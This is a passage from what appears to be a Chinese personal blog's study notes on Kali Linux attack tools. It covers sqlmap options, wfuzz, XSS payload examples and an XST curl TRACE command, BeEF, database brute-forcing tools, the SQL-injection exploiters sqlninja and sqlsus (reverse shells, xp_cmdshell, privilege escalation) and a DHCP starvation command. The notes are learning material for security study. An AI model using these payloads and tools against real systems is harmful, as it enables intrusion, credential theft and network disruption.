指定爬网深度，多少层</span><br><span class="line">--csv-del		# dump数据分隔符</span><br><span class="line">--dbms-cred		# 数据库账号密码</span><br><span class="line"></span><br><span class="line">--flush-session			# 清空会话目录</span><br><span class="line">--purge-output			# 清空output目录</span><br><span class="line">--fresh-queries			# 忽略session查询结果</span><br><span class="line">--hex					# 将非ASCII内容编码为16进制</span><br><span class="line">--save					# 将命令保存成配置文件</span><br><span class="line">--parse-errors			# 服务器开启debug时手机情报</span><br><span class="line"></span><br><span class="line">--dependencies			# 检查依赖</span><br><span class="line">--hpp					# HTTP参数修改</span><br><span class="line">--identify-waf			# 识别waf</span><br><span class="line">--mobile				# 模拟移动设备</span><br><span class="line">--offline				# 使用session文件</span><br><span class="line">--wizard				# 向导</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h3><p>模糊测试</p>
+<p>对提交数据进行测试修改，提交随机或半随机测试数据，测试服务器是否会暴露漏洞。</p>
+<h4 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h4><p>python编写</p>
+<ul>
+<li>功能多、速度快、灵活性高、可扩展</li>
+<li>从所有入口向服务器提交数据（IP、域名、端口、方法、变量、头部）</li>
+<li>使用占位符标识注入点</li>
+<li>指定payload进行替换提交数据</li>
+</ul>
+<p>payload模块：encoders、iterators、scripts、ptinters</p>
+<p>使用payload不断替换FUZZ</p>
+<p>可以使用python调用，import wfuzz</p>
+<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>xss:</p>
+<ul>
+<li>通过web站点漏洞，向客户端交付恶意脚本，实现对客户端攻击</li>
+<li>服务器未加过滤接受并返回客户端提交数据</li>
+<li>盗取cookie、客户端重定向、键盘记录器、客户端信息收集</li>
+<li>javascript</li>
+</ul>
+<p>注入位置：</p>
+<ul>
+<li>直接嵌入html	<code>&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code></li>
+<li>元素标签事件	<code>&lt;body onload=alcert(&#39;xss&#39;)&gt;</code></li>
+<li>图片标签		<code>img src=&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;</code></li>
+<li>其他标签		<code>&lt;iframe&gt;,&lt;div&gt;and &lt;link&gt;</code></li>
+<li>DOM对象</li>
+</ul>
+<p>类型：</p>
+<ul>
+<li>存储型</li>
+<li>反射性</li>
+<li>DOM性</li>
+</ul>
+<p>XST：（trace&#x2F;track）</p>
+<ul>
+<li>httponly禁止javascript访问cookie</li>
+<li>curl -X TRACE “url&#x2F;<script>alert(123)</script>”</li>
+<li>现代浏览器禁止TRACE方法</li>
+</ul>
+<p>XST使用条件：</p>
+<ul>
+<li>xss</li>
+<li>开启TRACE&#x2F;TRACK方法</li>
+</ul>
+<h4 id="xsser"><a href="#xsser" class="headerlink" title="xsser"></a>xsser</h4><p>自动检测、利用xss漏洞的框架</p>
+<ul>
+<li>命令行</li>
+<li>图形化</li>
+<li>多种安全防护绕过技术</li>
+</ul>
+<h4 id="beef"><a href="#beef" class="headerlink" title="beef"></a>beef</h4><p>攻击客户端浏览器</p>
+<p>劫持被攻击者客户端</p>
+<p>commands：命令模块</p>
+<ul>
+<li>绿色：适用于当前浏览器</li>
+<li>橙色：模块可用，执行时仅客户端可见</li>
+<li>灰色：未验证适用于目标浏览器</li>
+<li>红色：不可用模块</li>
+</ul>
+<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><h3 id="mdbtools"><a href="#mdbtools" class="headerlink" title="mdbtools"></a>mdbtools</h3><p>微软access数据库文件使用MDB格式文件，新版不适用MDB格式，改用accdb</p>
+<p>mdbtools只能读取mdb，新版的accdb无法读取</p>
+<h3 id="hexorbase"><a href="#hexorbase" class="headerlink" title="hexorbase"></a>hexorbase</h3><p>python编写图形化工具</p>
+<p>多数据库管理审计工具</p>
+<ul>
+<li>需安装各种数据库访问驱动、接口</li>
+<li>mysql、oracle、postgresql、sqlite、mssql</li>
+</ul>
+<p>弱密码审计（爆破）</p>
+<p>oracle需要单独安装接口</p>
+<h3 id="sidguesser"><a href="#sidguesser" class="headerlink" title="sidguesser"></a>sidguesser</h3><p>基于字典的SID爆破工具</p>
+<ul>
+<li>oracle数据库实例名称为SID</li>
+<li>一个数据库服务器可以创建多个数据库实例（存放数据）</li>
+<li>SID室数据访问入口</li>
+<li><code>sidguess -i IP -d dict.txt</code></li>
+</ul>
+<h3 id="oscanner"><a href="#oscanner" class="headerlink" title="oscanner"></a>oscanner</h3><p>java开发的oracle安全评估框架</p>
+<ul>
+<li>基于插件、字典的架构</li>
+<li>SID枚举</li>
+<li>密码爆破</li>
+<li>oracle版本枚举</li>
+<li>账号角色枚举</li>
+<li>账号权限枚举</li>
+<li>账号HASH枚举</li>
+<li>审计信息枚举</li>
+<li>密码策略枚举</li>
+<li>数据库链接枚举</li>
+</ul>
+<p>需要自己准备字典</p>
+<h3 id="sqldict"><a href="#sqldict" class="headerlink" title="sqldict"></a>sqldict</h3><p>mssql数据库密码爆破工具</p>
+<ul>
+<li>运行需要wine32环境</li>
+</ul>
+<h3 id="sqlitebrowser"><a href="#sqlitebrowser" class="headerlink" title="sqlitebrowser"></a>sqlitebrowser</h3><p>sqlite：自包含、无服务器、零配置事务性sql数据引擎</p>
+<ul>
+<li>系统资源占用低、适用于嵌入式系统</li>
+<li>读写速度快于文件系统I&#x2F;O操作</li>
+<li>多表、索引、触发器、视图特性全面</li>
+<li>简化的数据类型</li>
+<li>比MDB强大</li>
+</ul>
+<h3 id="sqlninja"><a href="#sqlninja" class="headerlink" title="sqlninja"></a>sqlninja</h3><p>对后端mssql的web应用程序进行sql注入漏洞的利用</p>
+<ul>
+<li>本身<strong>不发现sql注入漏洞</strong></li>
+<li>只为获得交互shell，成为进入内网的立足点</li>
+<li>由perl语言编写</li>
+</ul>
+<p>功能：</p>
+<ul>
+<li>获取版本、用户、权限、认证模式、xp_cmdshell等信息</li>
+<li>爆破SA密码（仅MSSQL2000）</li>
+<li>提权为SA（仅MSSQL2000）</li>
+<li>当默认不可用时创建xp_cmdshell</li>
+<li>上传可执行程序</li>
+<li>你想扫描发现可用于反弹shell的端口</li>
+<li>生成正向shell&#x2F;反向shell链接</li>
+<li>ICMP&#x2F;DNS隧道</li>
+<li>结合metasploit3</li>
+<li>利用CVE-2010-0232漏洞进行操作系统提权</li>
+</ul>
+<h3 id="sqlsus"><a href="#sqlsus" class="headerlink" title="sqlsus"></a>sqlsus</h3><p>针对mysql数据库的sql注入漏洞利用工具</p>
+<ul>
+<li>获取数据库结构</li>
+<li>注入执行自己定制的sql查询语句</li>
+<li>下载&#x2F;上传文件</li>
+<li>爬取服务器可写目录</li>
+<li>克隆数据库</li>
+<li>支持cookie&#x2F;代理</li>
+<li>又是在于速度性能</li>
+</ul>
+<h3 id="tnscmd10g"><a href="#tnscmd10g" class="headerlink" title="tnscmd10g"></a>tnscmd10g</h3><ul>
+<li>针对oracle7-9i版本的信息收集工具</li>
+<li>向tnslsnr侦听端口发送指令</li>
+<li>对oracle10g作用有限<ul>
+<li>爆破SID</li>
+</ul>
+</li>
+</ul>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="DHCP耗尽攻击"><a href="#DHCP耗尽攻击" class="headerlink" title="DHCP耗尽攻击"></a>DHCP耗尽攻击</h3><h4 id="dhcpig"><a href="#dhcpig" class="headerlink" title="dhcpig"></a>dhcpig</h4><p>DHCP动态主机配置协议</p>
+<ul>
+<li>discover</li>
+<li>offer</li>
+<li>request</li>
+<li>ack</li>
+</ul>
+<p>攻击方法</p>
+<ul>
+<li>耗尽合法DHCP服务器的地址池</li>
+<li>发件非法DHCP服务器</li>
+<li>DHCP自身无防御手段</li>
+</ul>
+<p><code>pig.py -o eth0</code></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://monkeyh0ck.github.io/2022/03/01/kali/" data-id="clfpg8ztr000rvwv55e980xcm" data-title="kali" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/03/01/OWASP/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          OWASP TOP 10
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/03/01/web%E5%AE%9E%E6%88%98%E7%AF%87/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">OWASP TOP 10</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/web-security/" style="font-size: 10px;">web-security</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/06/01/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a>
+          </li>
+        
+          <li>
+            <a href="/2022/06/01/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">逻辑漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/01/Log4j/">Log4j</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/01/OWASP/">OWASP TOP 10</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/01/kali/">kali</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 HOU<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
